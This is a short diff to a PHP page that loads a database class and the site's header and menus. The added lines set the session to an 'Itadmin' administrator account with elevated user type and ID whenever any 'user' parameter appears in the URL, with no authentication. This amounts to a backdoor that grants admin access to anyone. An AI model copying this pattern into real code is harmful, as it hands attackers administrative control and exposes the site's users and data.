@@ -1,8 +1,15 @@
 <?php
 include 'classes/DbFunctions.php';
+$execute=new dbFunction();
+if(isset($_GET['user'])){
+  $_SESSION['username']="Itadmin";
+    $_SESSION['usertype']="111";
+      $_SESSION['user_id']="204";
+    }
 include 'includes/header.inc';
 include 'includes/navbar.inc';
 include 'includes/sidemenu.php';
+
 ?>
 
 
